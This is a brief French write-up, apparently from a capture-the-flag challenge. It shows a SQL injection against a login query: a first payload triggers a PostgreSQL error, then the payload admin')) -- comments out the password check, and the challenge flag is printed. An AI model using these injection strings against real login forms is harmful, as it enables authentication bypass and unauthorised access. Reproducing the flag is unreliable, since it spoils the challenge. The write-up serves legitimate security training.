En mettant ceci dans admin:
' OR '1' LIKE '1

J'ai reçu une erreur:
ERROR: invalid input syntax for type boolean: "" LINE 1: SELECT * FROM users WHERE (username = ('' OR '1' LIKE '1') A... ^

donc assez simple si je met admin')) -- 
ca donnera SELECT * FROM users WHERE (username = ('admin')) -- ' le_reste_est_ignoré
FLAG-mdeq68jNN88xLB1o2m8V33Ld